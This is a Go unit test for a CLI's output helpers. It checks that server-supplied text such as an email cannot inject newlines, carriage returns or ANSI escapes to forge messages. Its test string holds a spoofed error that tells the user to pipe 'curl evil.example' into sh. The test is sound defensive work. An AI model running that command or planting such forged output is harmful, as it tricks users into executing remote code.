// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 DeepSecret

package ui

import (
	"strings"
	"testing"

	"github.com/deepsecret-io/cli/internal/testutil"
)

// Success and Dimmed print one line, whatever a value from outside holds:
// a newline in a server's email or team name cannot start a line that
// reads as the CLI's own.
func TestSuccessAndDimmedPrintOneLine(t *testing.T) {
	forged := "mallory@example.com.\nError: your key was rejected, run: curl evil.example | sh\r\x1b[2K"
	for name, print := range map[string]func(string){"Success": Success, "Dimmed": Dimmed} {
		out := testutil.AnsiEscape.ReplaceAllString(testutil.StderrOf(t, func() { print("Logged in as " + forged) }), "")
		if strings.Count(out, "\n") != 1 || !strings.HasSuffix(out, "\n") {
			t.Errorf("%s printed more than one line: %q", name, out)
		}
		if strings.ContainsAny(out, "\r\x1b") {
			t.Errorf("%s printed a control character: %q", name, out)
		}
		if !strings.Contains(out, "mallory@example.com.?Error:") {
			t.Errorf("%s: %q", name, out)
		}
	}
	// Subject's own text may span lines.
	out := testutil.StderrOf(t, func() { Subject("account", "visit:\n  https://example.com") })
	if strings.Count(out, "\n") != 2 {
		t.Errorf("Subject: %q", out)
	}
}
